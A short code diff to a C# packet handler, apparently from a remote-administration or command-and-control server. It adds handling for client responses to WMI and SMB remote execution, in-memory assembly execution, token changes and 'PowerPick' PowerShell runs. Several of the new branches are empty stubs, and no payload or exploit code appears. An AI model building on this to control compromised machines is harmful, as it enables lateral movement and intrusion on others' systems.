@@ -12,7 +12,6 @@ namespace xServer.Core.Packets
                 return;
 
             var type = packet.GetType();
-
             if (type == typeof(ClientPackets.SetStatus))
             {
                 CommandHandler.HandleSetStatus(client, (ClientPackets.SetStatus)packet);
@@ -133,6 +132,27 @@ namespace xServer.Core.Packets
             {
                 CommandHandler.HandleGetStopChatAgent((ClientPackets.GetStopChatAgent)packet, client);
                 //Agent closes chat.
+            }
+            else if (type == typeof(ClientPackets.DoWMIExecResponse))
+            {
+                //Get response from client whether execution succeeded or not.
+            }
+            else if (type == typeof(ClientPackets.DoSMBExecResponse))
+            {
+                //Get response from client whether execution succeeded or not.
+            }
+            else if (type == typeof(ClientPackets.DoExecuteAssemblyResponse))
+            {
+                
+            }
+            else if (type == typeof(ClientPackets.GetChangeToken))
+            {
+                CommandHandler.HandleDoChangeTokenResponse((ClientPackets.GetChangeToken)packet,client);
+            }
+            else if (type == typeof(ClientPackets.GetPowerPick))
+            {
+                CommandHandler.HandleGetPowerPick((ClientPackets.GetPowerPick)packet, client);
+                //Write Output to Window
             }
         }
     }
